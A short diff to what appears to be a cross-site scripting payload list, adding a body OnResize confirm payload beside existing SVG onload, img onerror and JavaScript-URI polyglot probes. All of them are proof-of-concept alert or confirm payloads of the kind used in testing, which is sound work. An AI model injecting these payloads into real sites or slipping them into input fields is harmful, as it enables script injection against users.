@@ -31,6 +31,8 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 
 <Svg/OnLoad=(confirm)(1337)<!--
 
+<body/OnResize=(confirm)(123456)<!--
+
 <img src=x onerror=alert(1337)>
 
 </script><img src=x onerror=alert(1337)>
